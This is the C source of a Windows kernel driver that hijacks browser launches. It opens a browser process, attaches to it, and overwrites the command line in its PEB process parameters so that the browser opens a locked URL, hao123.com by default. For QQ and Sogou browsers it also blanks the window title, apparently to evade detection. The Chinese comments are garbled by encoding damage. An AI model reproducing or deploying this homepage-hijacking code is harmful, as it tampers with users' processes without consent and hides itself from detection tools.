
#include <ntifs.h>

#include "LockCommandLine.h"
#include "ToolFunction.h"
#include "IoControl.h"

typedef unsigned short WORD;
typedef unsigned long DWORD;
typedef struct _CURDIR
{
	UNICODE_STRING DosPath;
	PVOID Handle;
} CURDIR, *PCURDIR;

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
	WORD Flags;
	WORD Length;
	ULONG TimeStamp;
	STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	ULONG MaximumLength;
	ULONG Length;
	ULONG Flags;
	ULONG DebugFlags;
	PVOID ConsoleHandle;
	ULONG ConsoleFlags;
	PVOID StandardInput;
	PVOID StandardOutput;
	PVOID StandardError;
	CURDIR CurrentDirectory;
	UNICODE_STRING DllPath;
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
	PVOID Environment;
	ULONG StartingX;
	ULONG StartingY;
	ULONG CountX;
	ULONG CountY;
	ULONG CountCharsX;
	ULONG CountCharsY;
	ULONG FillAttribute;
	ULONG WindowFlags;
	ULONG ShowWindowFlags;
	UNICODE_STRING WindowTitle;
	UNICODE_STRING DesktopInfo;
	UNICODE_STRING ShellInfo;
	UNICODE_STRING RuntimeData;
	RTL_DRIVE_LETTER_CURDIR CurrentDirectores[32];
	ULONG EnvironmentSize;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;



//////////////////////////////////////////////////////////////////////////
//
//  Ϊ64λ������ʹ��32λ���ݽṹ�������棺
//  ����ָ����DWORD(32 bit)����
//
//////////////////////////////////////////////////////////////////////////
//#pragma pack(4,push)
typedef struct _STRING_WOW64
{
	USHORT Length;
	USHORT MaximumLength;
	DWORD Buffer;
}STRING_WOW64, *PSTRING_WOW64;

typedef struct _UNICODE_STRING_WOW64
{
	USHORT Length;
	USHORT MaximumLength;
	DWORD Buffer;
}UNICODE_STRING_WOW64, *PUNICODE_STRING_WOW64;

typedef struct _CURDIR_WOW64
{
	UNICODE_STRING_WOW64 DosPath;
	DWORD Handle;
} CURDIR_WOW64, *PCURDIR_WOW64;


typedef struct _RTL_DRIVE_LETTER_CURDIR_WOW64
{
	WORD Flags;
	WORD Length;
	ULONG TimeStamp;
	STRING_WOW64 DosPath;
} RTL_DRIVE_LETTER_CURDIR_WOW64, *PRTL_DRIVE_LETTER_CURDIR_WOW64;


typedef struct _RTL_USER_PROCESS_PARAMETERS_WOW64
{
	ULONG MaximumLength;
	ULONG Length;
	ULONG Flags;
	ULONG DebugFlags;
	DWORD ConsoleHandle;
	ULONG ConsoleFlags;
	DWORD StandardInput;
	DWORD StandardOutput;
	DWORD StandardError;
	CURDIR_WOW64 CurrentDirectory;
	UNICODE_STRING_WOW64 DllPath;
	UNICODE_STRING_WOW64 ImagePathName;
	UNICODE_STRING_WOW64 CommandLine;
	DWORD Environment;
	ULONG StartingX;
	ULONG StartingY;
	ULONG CountX;
	ULONG CountY;
	ULONG CountCharsX;
	ULONG CountCharsY;
	ULONG FillAttribute;
	ULONG WindowFlags;
	ULONG ShowWindowFlags;
	UNICODE_STRING_WOW64 WindowTitle;
	UNICODE_STRING_WOW64 DesktopInfo;
	UNICODE_STRING_WOW64 ShellInfo;
	UNICODE_STRING_WOW64 RuntimeData;
	RTL_DRIVE_LETTER_CURDIR_WOW64 CurrentDirectores[32];
	ULONG EnvironmentSize;
} RTL_USER_PROCESS_PARAMETERS_WOW64, *PRTL_USER_PROCESS_PARAMETERS_WOW64;
//#pragma pack(pop)
//////////////////////////////////////////////////////////////////////////



extern EBrowserType g_CurrentBrowser;
WCHAR g_LockedURL[MAX_URL_LENGTH] = L"http://www.hao123.com";

NTSTATUS LhpSetLockInfo(PWSTR LockedURL)
{
	NTSTATUS Status = STATUS_SUCCESS;

	RtlZeroMemory(g_LockedURL, sizeof(g_LockedURL));
	Status = RtlStringCbCopyNW(g_LockedURL, sizeof(g_LockedURL), LockedURL, MAX_URL_LENGTH);

	return Status;
}


//////////////////////////////////////////////////////////////////////////
// ����64λ����
//////////////////////////////////////////////////////////////////////////
//
// �滻PEB-->RTL_USER_PROCESS_PARAMETERS�������
//
NTSTATUS LhpLockCommandLine(HANDLE ProcessId, LPWSTR ProcessImageName)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	CLIENT_ID ClientId;
	OBJECT_ATTRIBUTES ObjectAttributes;
	PRTL_USER_PROCESS_PARAMETERS NewProcessParameters = NULL;
	SIZE_T NewProcessParametersLength = 0x2000;
	WCHAR NewCommandLineBuffer[MAX_PATH] = {0};
	HANDLE hProcess = NULL;
	PEPROCESS Process = NULL;

	do
	{

		//
		// 1.�򿪽��̣���þ��
		//
		InitializeObjectAttributes(&ObjectAttributes, NULL, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
		ClientId.UniqueProcess = ProcessId;
		ClientId.UniqueThread = 0;

		Status = ZwOpenProcess(&hProcess, SYNCHRONIZE | STANDARD_RIGHTS_REQUIRED | SPECIFIC_RIGHTS_ALL, &ObjectAttributes, &ClientId);
		if (!NT_SUCCESS(Status))
			break;


		//
		// 2.�����û�̬�ڴ棬���������в���
		//
		Status = ZwAllocateVirtualMemory(hProcess, &NewProcessParameters, (ULONG_PTR)NULL, &NewProcessParametersLength, MEM_COMMIT, PAGE_READWRITE);
		if (!NT_SUCCESS(Status))
			break;

		RtlStringCbCopyW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), L"\"");
		RtlStringCbCatW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), ProcessImageName);
		RtlStringCbCatW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), L"\" \"");
		RtlStringCbCatW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), g_LockedURL);
		RtlStringCbCatW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), L"\"");

		//
		// !!!���ص���������̵�ַ�ռ�!!!
		//
		Status = PsLookupProcessByProcessId(ProcessId, &Process);
		if (!NT_SUCCESS(Status))
			break;

		KeAttachProcess(Process);


		__try
		{
			PPEB Peb = NULL;
			PRTL_USER_PROCESS_PARAMETERS RtlUserProcessParameter = NULL;
			int NewCommandLen = 0;
			int CommandLineIncrementSize = 0;
			int CommandLineOffset = 0;

			//
			// 3.�滻EPROCESS-->PEB-->RTL_USER_PROCSS_PARAMETER
			//

			Peb = *(PVOID*)((PUCHAR)Process + 0x338);
			RtlUserProcessParameter = *(PVOID*)((PUCHAR)Peb + 0x20);


			//
			// (1)����RTL_USER_PROCESS_PARAMETERS�ͺ���������CommandLineǰ�沿��
			//
			CommandLineOffset = (ULONG)((PUCHAR)RtlUserProcessParameter->CommandLine.Buffer - (PUCHAR)RtlUserProcessParameter);
			RtlZeroMemory(NewProcessParameters, NewProcessParametersLength);
			RtlCopyMemory(NewProcessParameters, RtlUserProcessParameter, CommandLineOffset);


			//
			// (2)�����µ������У���L'\0'��β
			//
			NewCommandLen = (wcslen(NewCommandLineBuffer) + 1)*sizeof(WCHAR);
			CommandLineIncrementSize = NewCommandLen - RtlUserProcessParameter->CommandLine.MaximumLength;
			RtlCopyMemory((PUCHAR)NewProcessParameters + CommandLineOffset, 
				NewCommandLineBuffer, 
				NewCommandLen
				);

			//
			// (3)���������к��������
			//
			RtlCopyMemory((PUCHAR)NewProcessParameters + CommandLineOffset + NewCommandLen,
				(PUCHAR)(RtlUserProcessParameter->CommandLine.Buffer) + RtlUserProcessParameter->CommandLine.MaximumLength,
				RtlUserProcessParameter->Length - ((ULONG)((PUCHAR)(RtlUserProcessParameter->CommandLine.Buffer) + RtlUserProcessParameter->CommandLine.MaximumLength - (PUCHAR)RtlUserProcessParameter))
				);

			//
			// (4)�޸������м�����沿�ֲ����ĵ�ַ
			//
			NewProcessParameters->MaximumLength = RtlUserProcessParameter->MaximumLength + CommandLineIncrementSize;
			NewProcessParameters->Length = RtlUserProcessParameter->Length + CommandLineIncrementSize;
			(PUCHAR)(NewProcessParameters->CommandLine.Buffer) += ((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
			NewProcessParameters->CommandLine.Length = NewCommandLen - 2;
			NewProcessParameters->CommandLine.MaximumLength = (USHORT)NewCommandLen;

			if (RtlUserProcessParameter->CurrentDirectory.DosPath.Buffer)
			{
				(PUCHAR)(NewProcessParameters->CurrentDirectory.DosPath.Buffer) += ((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
			}

			if (RtlUserProcessParameter->DllPath.Buffer)
			{
				(PUCHAR)(NewProcessParameters->DllPath.Buffer) += ((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
			}

			if (RtlUserProcessParameter->ImagePathName.Buffer)
			{
				(PUCHAR)(NewProcessParameters->ImagePathName.Buffer) += ((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
			}

			//
			// ����Ľ�����ƫ������
			//
			if (RtlUserProcessParameter->WindowTitle.Buffer)
			{
				(PUCHAR)(NewProcessParameters->WindowTitle.Buffer) += ((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
				(PUCHAR)(NewProcessParameters->WindowTitle.Buffer) += CommandLineIncrementSize;
			}
			
			if (RtlUserProcessParameter->DesktopInfo.Buffer)
			{
				(PUCHAR)(NewProcessParameters->DesktopInfo.Buffer) += ((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
				(PUCHAR)(NewProcessParameters->DesktopInfo.Buffer) += CommandLineIncrementSize;
			}

			if (RtlUserProcessParameter->ShellInfo.Buffer)
			{
				(PUCHAR)(NewProcessParameters->ShellInfo.Buffer) += ((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
				(PUCHAR)(NewProcessParameters->ShellInfo.Buffer) += CommandLineIncrementSize;
			}

			if (RtlUserProcessParameter->RuntimeData.Buffer)
			{
				(PUCHAR)(NewProcessParameters->RuntimeData.Buffer) += ((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
				(PUCHAR)(NewProcessParameters->RuntimeData.Buffer) += CommandLineIncrementSize;
			}


			//
			// (5)�滻
			//
			*(PRTL_USER_PROCESS_PARAMETERS*)((PUCHAR)Peb + 0x20) = NewProcessParameters;

		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			Status = STATUS_UNSUCCESSFUL;
		}

		//
		// !!!�����ҿ�!!!
		//
		KeDetachProcess();

	} while (FALSE);

	if (hProcess)
	{
		ZwClose(hProcess);
		hProcess = NULL;
	}

	if (Process)
	{
		ObDereferenceObject(Process);
		Process = NULL;
	}

	return Status;
}


//////////////////////////////////////////////////////////////////////////
// ����32λ����
//////////////////////////////////////////////////////////////////////////
//
// !!!ע��!!!:
// �����滻EPROCESS�е�PEB��Ч����Ҫ�滻EPROCESS-->Wow64Process-->PEB
// -->RTL_USER_PROCESS_PARAMETERS�������(����ṹ��32λ��)
//
//
NTSTATUS LhpLockCommandLineWow64(HANDLE ProcessId, LPWSTR ProcessImageName)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	CLIENT_ID ClientId;
	OBJECT_ATTRIBUTES ObjectAttributes;
	PRTL_USER_PROCESS_PARAMETERS_WOW64 NewProcessParameters = NULL;
	SIZE_T NewProcessParametersLength = 0x2000;
	WCHAR NewCommandLineBuffer[MAX_PATH] = {0};
	HANDLE hProcess = NULL;
	PEPROCESS Process = NULL;

	do 
	{
		//
		// 1.�򿪽��̣���þ��
		//
		InitializeObjectAttributes(&ObjectAttributes, NULL, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
		ClientId.UniqueProcess = ProcessId;
		ClientId.UniqueThread = 0;

		Status = ZwOpenProcess(&hProcess, SYNCHRONIZE | STANDARD_RIGHTS_REQUIRED | SPECIFIC_RIGHTS_ALL, &ObjectAttributes, &ClientId);
		if (!NT_SUCCESS(Status))
			break;


		//
		// 2.�����û�̬�ڴ棬���������в���
		//
		Status = ZwAllocateVirtualMemory(hProcess, &NewProcessParameters, (ULONG_PTR)NULL, &NewProcessParametersLength, MEM_COMMIT, PAGE_READWRITE);
		if (!NT_SUCCESS(Status))
			break;

		RtlStringCbCopyW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), L"\"");
		RtlStringCbCatW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), ProcessImageName);
		RtlStringCbCatW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), L"\" \"");
		RtlStringCbCatW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), g_LockedURL);
		RtlStringCbCatW(NewCommandLineBuffer, sizeof(NewCommandLineBuffer), L"\"");

		//
		// !!!���ص���������̵�ַ�ռ�!!!
		//
		Status = PsLookupProcessByProcessId(ProcessId, &Process);
		if (!NT_SUCCESS(Status))
			break;

		KeAttachProcess(Process);


		__try
		{
			PPEB Peb = NULL;
			PRTL_USER_PROCESS_PARAMETERS_WOW64 RtlUserProcessParameter = NULL;
			int NewCommandLen = 0;
			int CommandLineIncrementSize = 0;
			int CommandLineOffset = 0;

			//
			// 3.�滻EPROCESS-->PEB-->RTL_USER_PROCSS_PARAMETER
			//

			Peb = *(PVOID*)((PUCHAR)Process + 0x320);
			RtlCopyMemory(&RtlUserProcessParameter, (PUCHAR)Peb + 0x10, 4);


			//
			// (1)����RTL_USER_PROCESS_PARAMETERS�ͺ���������CommandLineǰ�沿��
			//
			CommandLineOffset = (ULONG)((PUCHAR)RtlUserProcessParameter->CommandLine.Buffer - (PUCHAR)RtlUserProcessParameter);
			RtlZeroMemory(NewProcessParameters, NewProcessParametersLength);
			RtlCopyMemory(NewProcessParameters, RtlUserProcessParameter, CommandLineOffset);


			//
			// (2)�����µ������У���L'\0'��β
			//
			NewCommandLen = (wcslen(NewCommandLineBuffer) + 1)*sizeof(WCHAR);
			CommandLineIncrementSize = NewCommandLen - RtlUserProcessParameter->CommandLine.MaximumLength;
			RtlCopyMemory((PUCHAR)NewProcessParameters + CommandLineOffset, 
				NewCommandLineBuffer, 
				NewCommandLen
				);

			//
			// (3)���������к��������
			//
			RtlCopyMemory((PUCHAR)NewProcessParameters + CommandLineOffset + NewCommandLen,
				(PUCHAR)(RtlUserProcessParameter->CommandLine.Buffer) + RtlUserProcessParameter->CommandLine.MaximumLength,
				RtlUserProcessParameter->Length - ((ULONG)((PUCHAR)(RtlUserProcessParameter->CommandLine.Buffer) + RtlUserProcessParameter->CommandLine.MaximumLength - (PUCHAR)RtlUserProcessParameter))
				);

			//
			// (4)�޸������м�����沿�ֲ����ĵ�ַ
			//
			NewProcessParameters->MaximumLength = RtlUserProcessParameter->MaximumLength + CommandLineIncrementSize;
			NewProcessParameters->Length = RtlUserProcessParameter->Length + CommandLineIncrementSize;
			NewProcessParameters->CommandLine.Buffer += (DWORD)((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
			NewProcessParameters->CommandLine.Length = NewCommandLen - 2;
			NewProcessParameters->CommandLine.MaximumLength = (USHORT)NewCommandLen;

			if (RtlUserProcessParameter->CurrentDirectory.DosPath.Buffer)
			{
				NewProcessParameters->CurrentDirectory.DosPath.Buffer += (DWORD)((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
			}

			if (RtlUserProcessParameter->DllPath.Buffer)
			{
				NewProcessParameters->DllPath.Buffer += (DWORD)((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
			}

			if (RtlUserProcessParameter->ImagePathName.Buffer)
			{
				NewProcessParameters->ImagePathName.Buffer += (DWORD)((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
			}

			//
			// ����Ľ�����ƫ������
			//
			if (RtlUserProcessParameter->WindowTitle.Buffer)
			{
				NewProcessParameters->WindowTitle.Buffer += (DWORD)((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
				NewProcessParameters->WindowTitle.Buffer += (DWORD)CommandLineIncrementSize;

				if (g_CurrentBrowser == e_Browser_QQ || g_CurrentBrowser == e_Browser_sogou)
				{
					//
					// ����QB�����WindowTitle�ֶΣ���ֹʶ�����shell����
					//
					PWSTR ptrWindowTtile = (PWSTR)NewProcessParameters->WindowTitle.Buffer;
					ptrWindowTtile[0] = L'\0';
				}
			}

			if (RtlUserProcessParameter->DesktopInfo.Buffer)
			{
				NewProcessParameters->DesktopInfo.Buffer += (DWORD)((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
				NewProcessParameters->DesktopInfo.Buffer += (DWORD)CommandLineIncrementSize;
			}

			if (RtlUserProcessParameter->ShellInfo.Buffer)
			{
				NewProcessParameters->ShellInfo.Buffer += (DWORD)((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
				NewProcessParameters->ShellInfo.Buffer += (DWORD)CommandLineIncrementSize;
			}

			if (RtlUserProcessParameter->RuntimeData.Buffer)
			{
				NewProcessParameters->RuntimeData.Buffer += (DWORD)((PUCHAR)NewProcessParameters - (PUCHAR)RtlUserProcessParameter);
				NewProcessParameters->RuntimeData.Buffer += (DWORD)CommandLineIncrementSize;
			}


			//
			// (5)�滻
			//
			RtlCopyMemory((PUCHAR)Peb + 0x10, (PUCHAR)&NewProcessParameters, 4);

		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			Status = STATUS_UNSUCCESSFUL;
		}

		//
		// !!!�����ҿ�!!!
		//
		KeDetachProcess();

	} while (FALSE);

	if (hProcess)
	{
		ZwClose(hProcess);
		hProcess = NULL;
	}

	if (Process)
	{
		ObDereferenceObject(Process);
		Process = NULL;
	}

	return Status;
}